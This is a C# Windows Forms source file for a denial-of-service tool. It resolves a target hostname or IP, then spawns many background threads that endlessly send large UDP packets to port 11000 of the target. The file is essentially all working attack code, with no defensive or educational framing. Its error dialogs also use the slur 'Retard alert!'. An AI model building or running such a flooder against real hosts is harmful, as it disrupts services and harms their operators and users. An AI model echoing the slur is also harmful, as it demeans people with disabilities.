using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace AskesLøg
{
    public partial class Form1 : Form
    {
        IPAddress[] target;
        bool ready = false;
        public Form1()
        {
            InitializeComponent();
            label_url.Links.Add(0,0,"https://en.wikipedia.org/wiki/Uniform_Resource_Locator");
            label_ip.Links.Add(0, 0, "https://en.wikipedia.org/wiki/IP_address");
            label_threads.Links.Add(0, 0, "https://en.wikipedia.org/wiki/Thread_(computing)");
            btn_pedal.Enabled = false;
            this.label_threadCount.Text = trackBar1.Value.ToString();
        }

        private void label_url_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start(e.Link.LinkData.ToString());
        }

        private void label_ip_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start(e.Link.LinkData.ToString());
        }
        private void label_threads_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start(e.Link.LinkData.ToString());
        }

        private void btn_pedal_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < trackBar1.Value; i++)
            {
                Thread th = new Thread(() => pedal(target[0]));
                th.IsBackground = true;
                th.Start();
            }
        }

        private void pedal(IPAddress serverAddr)
        {
            while (ready)
            {
                try
                {
                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    sock.SendBufferSize = 10 * 1024;

                    IPEndPoint endPoint = new IPEndPoint(serverAddr, 11000);


                    //string text = ;
                    byte[] send_buffer = Encoding.ASCII.GetBytes(String.Concat(Enumerable.Repeat(textBox1.Text, 2000)));

                    sock.SendTo(send_buffer, endPoint);
                    //Thread.Sleep(1);
                }
                catch (Exception)
                {
                }
                
            }          
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(tb_url.Text == "" && tb_ip.Text != "")
            {
                if (IPAddress.TryParse(tb_ip.Text, out target[0]))
                {
                    label_dns_ip.Text = target[0].ToString();
                    ready = true;
                    btn_pedal.Enabled = true;
                }
                else
                {
                    MessageBox.Show("Please enter a valid IP Address!", "Retard alert!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else if (tb_ip.Text == "" && tb_url.Text != "")
            {
                try
                {
                    target = Dns.GetHostAddresses(tb_url.Text);
                    label_dns_ip.Text = target[0].ToString();
                    ready = true;
                    btn_pedal.Enabled = true;
                }
                catch (Exception)
                {
                    MessageBox.Show(
                        "You did not enter a valid hostname...",
                         "Retard alert!",
                         MessageBoxButtons.OK, 
                         MessageBoxIcon.Error);
                }
            }
        }

        private void tb_url_TextChanged(object sender, EventArgs e)
        {
            ready = false;
            btn_pedal.Enabled = false;
        }

        private void tb_ip_TextChanged(object sender, EventArgs e)
        {
            ready = false;
            btn_pedal.Enabled = false;
        }

        private void trackBar1_ValueChanged(object sender, EventArgs e)
        {
            this.label_threadCount.Text = trackBar1.Value.ToString();
        }
    }
}
